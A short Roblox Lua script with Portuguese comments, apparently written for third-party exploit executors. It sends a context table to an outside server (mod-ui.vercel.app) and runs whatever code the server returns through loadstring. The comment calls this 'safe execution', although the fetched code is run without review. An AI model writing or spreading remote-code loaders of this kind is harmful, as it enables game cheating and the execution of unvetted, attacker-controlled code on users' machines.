local HttpService = game:GetService("HttpService")

-- compatibilidade com exploits
local request = request or http_request or syn and syn.request

if not request then
    warn("Exploit não suporta request")
    return
end

local ctx = getgenv().__CTX__ or {}

-- fallback básico
if not ctx.mod then
    warn("CTX inválido: mod não definido")
    return
end

local success, response = pcall(function()
    return request({
        Url = "https://mod-ui.vercel.app/resolver/exec",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(ctx)
    })
end)

if not success or not response then
    warn("Falha na requisição")
    return
end

if response.StatusCode ~= 200 then
    warn("Erro do servidor:", response.StatusCode)
    return
end

local code = response.Body

-- execução segura
local ok, err = pcall(function()
    loadstring(code)()
end)

if not ok then
    warn("Erro ao executar script:", err)
end